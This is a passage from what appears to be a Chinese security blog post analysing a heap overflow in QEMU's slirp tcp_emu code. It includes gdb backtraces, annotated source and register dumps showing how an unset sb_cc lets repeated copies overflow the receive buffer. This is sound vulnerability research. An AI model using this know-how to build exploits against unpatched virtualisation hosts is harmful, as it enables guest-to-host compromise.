/home/wz/qemu/net/queue.c:224</span><br><span class="line"><span class="comment">#9  0x000056278deb6acd in qemu_sendv_packet_async (sender=0x56279009cb90, iov=0x7f57cce95bd0, iovcnt=0x1, sent_cb=0x0)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:775</span><br><span class="line"><span class="comment">#10 0x000056278deb6afa in qemu_sendv_packet (nc=0x56279009cb90, iov=0x7f57cce95bd0, iovcnt=0x1) at /home/wz/qemu/net/net.c:783</span></span><br><span class="line"><span class="comment">#11 0x000056278deba0d1 in net_hub_receive_iov (hub=0x56279009c9c0, source_port=0x56279009cf70, iov=0x7f57cce95bd0, iovcnt=0x1)</span></span><br><span class="line">    at /home/wz/qemu/net/hub.c:74</span><br><span class="line"><span class="comment">#12 0x000056278deba2cb in net_hub_port_receive_iov (nc=0x56279009cf70, iov=0x7f57cce95bd0, iovcnt=0x1)</span></span><br><span class="line">    at /home/wz/qemu/net/hub.c:125</span><br><span class="line"><span class="comment">#13 0x000056278deb696d in qemu_deliver_packet_iov (sender=0x5627910449a0, flags=0x0, iov=0x7f57cce95bd0, iovcnt=0x1, opaque=0x5627900</span></span><br><span class="line">9cf70) at /home/wz/qemu/net/net.c:732</span><br><span class="line"><span class="comment">#14 0x000056278deb94c5 in qemu_net_queue_deliver (queue=0x56279009d110, sender=0x5627910449a0, flags=0x0, data=0x5627910329b0 "RU\n", size=0x536) at /home/wz/qemu/net/queue.c:164</span></span><br><span class="line"><span class="comment">#15 0x000056278deb95e1 in qemu_net_queue_send (queue=0x56279009d110, sender=0x5627910449a0, flags=0x0, data=0x5627910329b0 "RU\n", si</span></span><br><span class="line">ze=0x536, sent_cb=0x0) at /home/wz/qemu/net/queue.c:199</span><br><span class="line"><span class="comment">#16 0x000056278deb672d in qemu_send_packet_async_with_flags (sender=0x5627910449a0, flags=0x0, buf=0x5627910329b0 "RU\n", size=0x536,</span></span><br><span class="line"> sent_cb=0x0) at /home/wz/qemu/net/net.c:660</span><br><span class="line"><span class="comment">#17 0x000056278deb6765 in qemu_send_packet_async (sender=0x5627910449a0, buf=0x5627910329b0 "RU\n", size=0x536, sent_cb=0x0)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:667</span><br><span class="line"><span class="comment">#18 0x000056278deb6792 in qemu_send_packet (nc=0x5627910449a0, buf=0x5627910329b0 "RU\n", size=0x536)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:673</span><br><span class="line"><span class="comment">#19 0x000056278dd9989e in e1000_send_packet (s=0x56279100fd00, buf=0x5627910329b0 "RU\n", size=0x536)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:538</span><br><span class="line"><span class="comment">#20 0x000056278dd99d0a in xmit_seg (s=0x56279100fd00)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:601</span><br><span class="line"><span class="comment">#21 0x000056278dd9a23a in process_tx_desc (s=0x56279100fd00, dp=0x7f57cce95e10) at /home/wz/qemu/hw/net/e1000.c:688</span></span><br><span class="line"><span class="comment">#22 0x000056278dd9a432 in start_xmit (s=0x56279100fd00)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:743</span><br><span class="line"><span class="comment">#23 0x000056278dd9b4c8 in set_tctl (s=0x56279100fd00, index=0xe06, val=0x22) at /home/wz/qemu/hw/net/e1000.c:1111</span></span><br><span class="line"><span class="comment">#24 0x000056278dd9b645 in e1000_mmio_write (opaque=0x56279100fd00, addr=0x3818, val=0x22, size=0x4)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:1287</span><br><span class="line"><span class="comment">#25 0x000056278dad1991 in memory_region_write_accessor (mr=0x562791012600, addr=0x3818, value=0x7f57cce95f78, size=0x4, shift=0x0, ma</span></span><br><span class="line">sk=0xffffffff, attrs=...) at /home/wz/qemu/memory.c:504</span><br><span class="line"><span class="comment">#26 0x000056278dad1ba1 in access_with_adjusted_size (addr=0x3818, value=0x7f57cce95f78, size=0x4, access_size_min=0x4, access_size_ma</span></span><br><span class="line">x=0x4, access_fn=</span><br><span class="line">    0x56278dad18a8 &lt;memory_region_write_accessor&gt;, mr=0x562791012600, attrs=...) at /home/wz/qemu/memory.c:570</span><br><span class="line"><span class="comment">#27 0x000056278dad489c in memory_region_dispatch_write (mr=0x562791012600, addr=0x3818, data=0x22, size=0x4, attrs=...)</span></span><br><span class="line">    at /home/wz/qemu/memory.c:1452</span><br><span class="line"><span class="comment">#28 0x000056278da6f896 in flatview_write_continue (fv=0x7f57c47e7c00, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d028 "\"", len=0x4, a</span></span><br><span class="line">ddr1=0x3818, l=0x4, mr=0x562791012600)</span><br><span class="line">    at /home/wz/qemu/exec.c:3233</span><br><span class="line"><span class="comment">#29 0x000056278da6f9e0 in flatview_write (fv=0x7f57c47e7c00, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d028 "\"", len=0x4)</span></span><br><span class="line">    at /home/wz/qemu/exec.c:3272</span><br><span class="line"><span class="comment">#30 0x000056278da6fce6 in address_space_write (as=0x56278ea29de0 &lt;address_space_memory&gt;, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d0</span></span><br><span class="line">28 <span class="string">"\""</span>, len=0x4) at /home/wz/qemu/exec.c:3362</span><br><span class="line"><span class="comment">#31 0x000056278da6fd37 in address_space_rw (as=0x56278ea29de0 &lt;address_space_memory&gt;, addr=0xfebc3818, attrs=..., buf=0x7f57ea23d028</span></span><br><span class="line"><span class="string">"\""</span>, len=0x4, is_write=0x1) at /home/wz/qemu/exec.c:3373</span><br><span class="line"><span class="comment">#32 0x000056278daf0c86 in kvm_cpu_exec (cpu=0x5627900b3990)</span></span><br><span class="line">    at /home/wz/qemu/accel/kvm/kvm-all.c:2031</span><br><span class="line"><span class="comment">#33 0x000056278dab6a78 in qemu_kvm_cpu_thread_fn (arg=0x5627900b3990) at /home/wz/qemu/cpus.c:1281</span></span><br><span class="line"><span class="comment">#34 0x000056278e06a004 in qemu_thread_start (args=0x5627900d6710)</span></span><br><span class="line">    at /home/wz/qemu/util/qemu-thread-posix.c:498</span><br><span class="line"><span class="comment">#35 0x00007f57e46c16db in start_thread (arg=0x7f57cce99700)</span></span><br><span class="line">    at pthread_create.c:463</span><br><span class="line"><span class="comment">#36 0x00007f57e43ea71f in clone ()</span></span><br><span class="line">    at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>查看位于<code>slirp/tcp_subr.c</code>的函数实现，<code>so_rcv</code>的类型为<code>struct sbuf *</code>，它存储的是tcp协议的数据，<code>m</code>的类型为<code>struct mbuf *</code>，它存储的是ip协议的数据，这里的<code>memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</code>将网络层的数据保存到了传输层中。这两个数据结构的定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sb_cc;		<span class="comment">/* actual chars in buffer */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> sb_datalen;	<span class="comment">/* Length of data  */</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_wptr;	<span class="comment">/* write pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * bytes should be written in the sbuf */</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_rptr;	<span class="comment">/* read pointer. points to where the next</span></span><br><span class="line"><span class="comment">				 * byte should be read from the sbuf */</span></span><br><span class="line">	<span class="keyword">char</span>	*sb_data;	<span class="comment">/* Actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_next</span>;</span>       <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span>    <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span>    <span class="comment">/* Flags aren't used in the output queue */</span></span><br><span class="line">    <span class="keyword">int</span> m_flags;        <span class="comment">/* Misc flags */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m_size;         <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">caddr_t</span> m_data;         <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="keyword">int</span> m_len;          <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line"></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="keyword">bool</span>    resolution_requested;</span><br><span class="line">    <span class="keyword">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="keyword">char</span>   *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="keyword">char</span>    m_dat[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当传输的数据中包含有<code>\r|\n</code>时，会对<code>so_rcv-&gt;sb_cc</code>赋值，否则保持其默认值0，我们发送的payload中不包含有<code>\r\n</code>，因此sb_cc不会被赋值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">tcp_emu(struct socket *so, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	Slirp *slirp = so-&gt;slirp;</span><br><span class="line">	u_int n1, n2, n3, n4, n5, n6;</span><br><span class="line">        <span class="keyword">char</span> buff[<span class="number">257</span>];</span><br><span class="line">	<span class="keyword">uint32_t</span> laddr;</span><br><span class="line">	u_int lport;</span><br><span class="line">	<span class="keyword">char</span> *bptr;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"tcp_emu"</span>);</span><br><span class="line">	DEBUG_ARG(<span class="string">"so = %p"</span>, so);</span><br><span class="line">	DEBUG_ARG(<span class="string">"m = %p"</span>, m);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(so-&gt;so_emu) &#123;</span><br><span class="line">		<span class="keyword">int</span> x, i;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">			<span class="keyword">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> = &amp;<span class="title">so</span>-&gt;<span class="title">so_rcv</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">			so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">			so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br><span class="line">			m-&gt;m_data[m-&gt;m_len] = <span class="number">0</span>; <span class="comment">/* NULL terminate */</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'\r'</span>) || <span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">'\n'</span>)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">sscanf</span>(so_rcv-&gt;sb_data, <span class="string">"%u%*[ ,]%u"</span>, &amp;n1, &amp;n2) == <span class="number">2</span>) &#123;</span><br><span class="line">					HTONS(n1);</span><br><span class="line">					HTONS(n2);</span><br><span class="line">					<span class="comment">/* n2 is the one on our host */</span></span><br><span class="line">					<span class="keyword">for</span> (tmpso = slirp-&gt;tcb.so_next;</span><br><span class="line">					     tmpso != &amp;slirp-&gt;tcb;</span><br><span class="line">					     tmpso = tmpso-&gt;so_next) &#123;</span><br><span class="line">						<span class="keyword">if</span> (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_lport == n2 &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;</span><br><span class="line">						    tmpso-&gt;so_fport == n1) &#123;</span><br><span class="line">							<span class="keyword">if</span> (getsockname(tmpso-&gt;s,</span><br><span class="line">								(struct sockaddr *)&amp;addr, &amp;addrlen) == <span class="number">0</span>)</span><br><span class="line">							   n2 = ntohs(addr.sin_port);</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">                so_rcv-&gt;sb_cc = <span class="built_in">snprintf</span>(so_rcv-&gt;sb_data,so_rcv-&gt;sb_datalen,<span class="string">"%d,%d\r\n"</span>, n1, n2);</span><br><span class="line">				so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;</span><br><span class="line">				so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;</span><br><span class="line">			&#125;</span><br><span class="line">			m_free(m);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续往下看其调用函数<code>tcp_input</code>，位于<code>slirp/tcp_input.c</code>中。ti为<code>struct tcpiphdr</code>类型的变量，其定义如下。ti_len表示协议长度，由于拷贝之后sb_cc还是为0，因此会使用<code>sbappend(so, m)-&gt;sbappendsb</code>进行追加拷贝，从而造成堆溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc)</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Tcp+ip header, after ip options removed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpiphdr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf_ptr</span> <span class="title">ih_mbuf</span>;</span>	<span class="comment">/* backpointer to mbuf */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_src</span>;</span> <span class="comment">/* source internet address */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">ih_dst</span>;</span> <span class="comment">/* destination internet address */</span></span><br><span class="line">            <span class="keyword">uint8_t</span> ih_x1;          <span class="comment">/* (unused) */</span></span><br><span class="line">            <span class="keyword">uint8_t</span> ih_pr;          <span class="comment">/* protocol */</span></span><br><span class="line">        &#125; ti_i4;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_src</span>;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span>  <span class="title">in6_addr</span> <span class="title">ih_dst</span>;</span></span><br><span class="line">            <span class="keyword">uint8_t</span> ih_x1;</span><br><span class="line">            <span class="keyword">uint8_t</span> ih_nh;</span><br><span class="line">        &#125; ti_i6;</span><br><span class="line">    &#125; ti;</span><br><span class="line">    <span class="keyword">uint16_t</span>    ti_x0;</span><br><span class="line">    <span class="keyword">uint16_t</span>    ti_len;             <span class="comment">/* protocol length */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>      <span class="title">tcphdr</span> <span class="title">ti_t</span>;</span>        <span class="comment">/* tcp header */</span></span><br><span class="line">&#125;;</span><br><span class="line">tcp_input(struct mbuf *m, <span class="keyword">int</span> iphlen, struct socket *inso, <span class="keyword">unsigned</span> short af)</span><br><span class="line">&#123;	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp;</span><br><span class="line">				tcpfrag_list_empty(tp) &amp;&amp;</span><br><span class="line">				ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) &#123;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				* this is a pure, in-sequence data packet</span></span><br><span class="line"><span class="comment">				* with nothing on the reassembly queue and</span></span><br><span class="line"><span class="comment">				* we have enough buffer space to take it.</span></span><br><span class="line"><span class="comment">				*/</span></span><br><span class="line">				tp-&gt;rcv_nxt += ti-&gt;ti_len;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				* Add data to socket buffer.</span></span><br><span class="line"><span class="comment">				*/</span></span><br><span class="line">				<span class="keyword">if</span> (so-&gt;so_emu) &#123;</span><br><span class="line">					<span class="keyword">if</span> (tcp_emu(so,m)) sbappend(so, m);</span><br><span class="line">				&#125; <span class="keyword">else</span></span><br><span class="line">					sbappend(so, m);</span><br><span class="line"></span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				* If this is a short packet, then ACK now - with Nagel</span></span><br><span class="line"><span class="comment">				*	congestion avoidance sender won't send more until</span></span><br><span class="line"><span class="comment">				*	he gets an ACK.</span></span><br><span class="line"><span class="comment">				*</span></span><br><span class="line"><span class="comment">				* It is better to not delay acks at all to maximize</span></span><br><span class="line"><span class="comment">				* TCP throughput.  See RFC 2581.</span></span><br><span class="line"><span class="comment">				*/</span></span><br><span class="line">				tp-&gt;t_flags |= TF_ACKNOW;</span><br><span class="line">				tcp_output(tp);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Try and write() to the socket, whatever doesn't get written</span></span><br><span class="line"><span class="comment"> * append to the buffer... for a host with a fast net connection,</span></span><br><span class="line"><span class="comment"> * this prevents an unnecessary copy of the data</span></span><br><span class="line"><span class="comment"> * (the socket is non-blocking, so we won't hang)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">sbappend(struct socket *so, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	DEBUG_CALL(<span class="string">"sbappend"</span>);</span><br><span class="line">	DEBUG_ARG(<span class="string">"so = %p"</span>, so);</span><br><span class="line">	DEBUG_ARG(<span class="string">"m = %p"</span>, m);</span><br><span class="line">	DEBUG_ARG(<span class="string">"m-&gt;m_len = %d"</span>, m-&gt;m_len);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Shouldn't happen, but...  e.g. foreign host closes connection */</span></span><br><span class="line">	<span class="keyword">if</span> (m-&gt;m_len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		m_free(m);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there is urgent data, call sosendoob</span></span><br><span class="line"><span class="comment">	 * if not all was sent, sowrite will take care of the rest</span></span><br><span class="line"><span class="comment">	 * (The rest of this function is just an optimisation)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (so-&gt;so_urgc) &#123;</span><br><span class="line">		sbappendsb(&amp;so-&gt;so_rcv, m);</span><br><span class="line">		m_free(m);</span><br><span class="line">		(<span class="keyword">void</span>)sosendoob(so);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We only write if there's nothing in the buffer,</span></span><br><span class="line"><span class="comment">	 * ottherwise it'll arrive out of order, and hence corrupt</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!so-&gt;so_rcv.sb_cc)</span><br><span class="line">	   ret = slirp_send(so, m-&gt;m_data, m-&gt;m_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Nothing was written</span></span><br><span class="line"><span class="comment">		 * It's possible that the socket has closed, but</span></span><br><span class="line"><span class="comment">		 * we don't need to check because if it has closed,</span></span><br><span class="line"><span class="comment">		 * it will be detected in the normal way by soread()</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		sbappendsb(&amp;so-&gt;so_rcv, m);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != m-&gt;m_len) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Something was written, but not everything..</span></span><br><span class="line"><span class="comment">		 * sbappendsb the rest</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		m-&gt;m_len -= ret;</span><br><span class="line">		m-&gt;m_data += ret;</span><br><span class="line">		sbappendsb(&amp;so-&gt;so_rcv, m);<span class="comment">//这里</span></span><br><span class="line">	&#125; <span class="comment">/* else */</span></span><br><span class="line">	<span class="comment">/* Whatever happened, we free the mbuf */</span></span><br><span class="line">	m_free(m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy the data from m into sb</span></span><br><span class="line"><span class="comment"> * The caller is responsible to make sure there's enough room</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">sbappendsb(struct sbuf *sb, struct mbuf *m)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> len, n,  nn;</span><br><span class="line"></span><br><span class="line">	len = m-&gt;m_len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sb-&gt;sb_wptr &lt; sb-&gt;sb_rptr) &#123;</span><br><span class="line">		n = sb-&gt;sb_rptr - sb-&gt;sb_wptr;</span><br><span class="line">		<span class="keyword">if</span> (n &gt; len) n = len;</span><br><span class="line">		<span class="built_in">memcpy</span>(sb-&gt;sb_wptr, m-&gt;m_data, n);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* Do the right edge first */</span></span><br><span class="line">		n = sb-&gt;sb_data + sb-&gt;sb_datalen - sb-&gt;sb_wptr;</span><br><span class="line">		<span class="keyword">if</span> (n &gt; len) n = len;</span><br><span class="line">		<span class="built_in">memcpy</span>(sb-&gt;sb_wptr, m-&gt;m_data, n);<span class="comment">//这里追加拷贝</span></span><br><span class="line">		len -= n;</span><br><span class="line">		<span class="keyword">if</span> (len) &#123;</span><br><span class="line">			<span class="comment">/* Now the left edge */</span></span><br><span class="line">			nn = sb-&gt;sb_rptr - sb-&gt;sb_data;</span><br><span class="line">			<span class="keyword">if</span> (nn &gt; len) nn = len;</span><br><span class="line">			<span class="built_in">memcpy</span>(sb-&gt;sb_data,m-&gt;m_data+n,nn);</span><br><span class="line">			n += nn;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sb-&gt;sb_cc += n;</span><br><span class="line">	sb-&gt;sb_wptr += n;</span><br><span class="line">	<span class="keyword">if</span> (sb-&gt;sb_wptr &gt;= sb-&gt;sb_data + sb-&gt;sb_datalen)</span><br><span class="line">		sb-&gt;sb_wptr -= sb-&gt;sb_datalen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们动态调试一下，验证自己的猜想,断点断到比较和memcpy处.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">directory /home/wz/qemu/slirp/tcp_input.c</span><br><span class="line">b /home/wz/qemu/slirp/tcp_subr.c:638</span><br><span class="line">b /home/wz/qemu/slirp/tcp_input.c:558</span><br></pre></td></tr></table></figure>
<p>可以看到ti_len一直为我们输入的长度0x500，<code>sb_datalen</code>为0x2238的固定值，因为sb_cc为0，因此这里的比较恒成立，故而持续拷贝造成堆溢出。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p *ti</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  ih_mbuf = &#123;</span><br><span class="line">    mptr = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  ti = &#123;</span><br><span class="line">    ti_i4 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        s_addr = 0xf02000a</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        s_addr = 0x202000a</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = 0x0,</span><br><span class="line">      ih_pr = 0x6</span><br><span class="line">    &#125;,</span><br><span class="line">    ti_i6 = &#123;</span><br><span class="line">      ih_src = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = <span class="string">"\n\000\002\017\n\000\002\002\000\006\000\000\000\000\000"</span>,</span><br><span class="line">          __u6_addr16 = &#123;0xa, 0xf02, 0xa, 0x202, 0x600, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">          __u6_addr32 = &#123;0xf02000a, 0x202000a, 0x600, 0x0&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_dst = &#123;</span><br><span class="line">        __in6_u = &#123;</span><br><span class="line">          __u6_addr8 = <span class="string">'\000'</span> &lt;repeats 15 <span class="built_in">times</span>&gt;,</span><br><span class="line">          __u6_addr16 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">          __u6_addr32 = &#123;0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      ih_x1 = 0x0,</span><br><span class="line">      ih_nh = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  ti_x0 = 0x0,</span><br><span class="line">  ti_len = 0x500,//输入长度</span><br><span class="line">  ti_t = &#123;</span><br><span class="line">    th_sport = 0x2e4,</span><br><span class="line">    th_dport = 0x7100,</span><br><span class="line">    th_seq = 0x4cc0331,</span><br><span class="line">    th_ack = 0x271002,</span><br><span class="line">    th_x2 = 0x0,</span><br><span class="line">    th_off = 0x5,</span><br><span class="line">    th_flags = 0x18,</span><br><span class="line">    th_win = 0x7210,</span><br><span class="line">    th_sum = 0xef00,</span><br><span class="line">    th_urp = 0x0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x2238 (<span class="string">'8"'</span>)</span><br><span class="line">RBX: 0x7f3f7821fcf0 (0x00007f3f7821fcf0)</span><br><span class="line">RCX: 0x2238 (<span class="string">'8"'</span>)</span><br><span class="line">RDX: 0x500</span><br><span class="line">RSI: 0x7f3f877fa770 --&gt; 0x202000a71000002</span><br><span class="line">RDI: 0x7f3f78214e38 --&gt; 0x202000a71000002</span><br><span class="line">RBP: 0x7f3f877fa830 --&gt; 0x7f3f877fa880 --&gt; 0x7f3f877fa8c0 --&gt; 0x7f3f877fa910 --&gt; 0x7f3f877fa960 --&gt; 0x7f3f877fa9a0 (--&gt; ...)</span><br><span class="line">RSP: 0x7f3f877fa5f0 --&gt; 0x7f3f877fa630 --&gt; 0x544877fa6a0</span><br><span class="line">RIP: 0x55ea3f7d0a12 (&lt;tcp_input+3115&gt;:  cmp    edx,eax)</span><br><span class="line">R8 : 0x14</span><br><span class="line">R9 : 0x7f3f7820d680 --&gt; 0x600</span><br><span class="line">R10: 0x7f3f877fabe0 --&gt; 0x0</span><br><span class="line">R11: 0x7f3f7820db94 (<span class="string">'A'</span> &lt;repeats 32 <span class="built_in">times</span>&gt;)</span><br><span class="line">R12: 0x7f3f7820d670 --&gt; 0x0</span><br><span class="line">R13: 0x18</span><br><span class="line">R14: 0x55ea40ff9710 --&gt; 0x55ea40ff9500 --&gt; 0x0</span><br><span class="line">R15: 0x7ffe46247360 --&gt; 0x0</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55ea3f7d0a08 &lt;tcp_input+3105&gt;:     mov    eax,DWORD PTR [rax+0x158]</span><br><span class="line">   0x55ea3f7d0a0e &lt;tcp_input+3111&gt;:     sub    ecx,eax</span><br><span class="line">   